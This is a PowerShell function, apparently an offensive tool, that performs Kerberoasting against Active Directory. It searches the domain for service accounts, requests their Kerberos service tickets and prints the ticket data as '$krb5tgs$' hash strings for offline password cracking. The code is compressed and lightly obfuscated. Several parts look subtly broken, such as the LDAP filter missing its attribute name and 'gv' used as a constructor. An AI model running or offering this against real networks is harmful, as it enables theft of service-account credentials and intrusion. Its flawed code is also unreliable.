function Get-Kerberoast {
${q}=[adsisearcher]"(&(servicePrincipalName=*)(805306368))";${q}.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname'))|Out-Null;
${q}.FindAll()|%{${n}=$_.Properties.samaccountname[0];if(${n}-ne'krbtgt'){${s}=$_.Properties.serviceprincipalname[0];${t}=(gv System.IdentityModel.Tokens.KerberosRequestorSecurityToken).New(${s});${h}=([BitConverter]::ToString(${t}.GetRequest())-replace'-' -split'A382.{4}A0030201.{12}A282.{4}')[1][0..67]-join'';"`$krb5tgs`$${s}:$h"}}|?{$_}
}
